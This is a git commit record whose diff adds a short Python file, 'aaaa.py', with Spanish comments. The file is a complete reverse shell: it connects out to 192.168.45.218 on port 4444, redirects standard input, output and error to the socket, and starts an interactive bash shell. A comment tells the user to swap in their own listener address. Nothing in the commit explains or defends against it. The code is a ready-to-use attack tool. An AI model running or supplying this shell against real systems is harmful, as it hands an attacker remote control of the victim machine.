d0699c7a6d68d61342003fd31e17d4fd05f1c2cc
Juan Mautone <juan.ignaciomautone@gmail.com>
2024-12-16 15:48:05 -0300

    Create aaaa.py

---
+++ aaaa.py
@@ -0,0 +1,19 @@
+import socket
+import subprocess
+import os
+
+# Configuración de la conexión
+ip = "192.168.45.218"  # Cambia por tu IP
+port = 4444  # Cambia por el puerto que escucharás
+
+# Crear el socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((ip, port))
+
+# Redirigir entradas y salidas
+os.dup2(s.fileno(), 0)  # stdin
+os.dup2(s.fileno(), 1)  # stdout
+os.dup2(s.fileno(), 2)  # stderr
+
+# Abrir shell
+subprocess.call(["/bin/bash", "-i"])
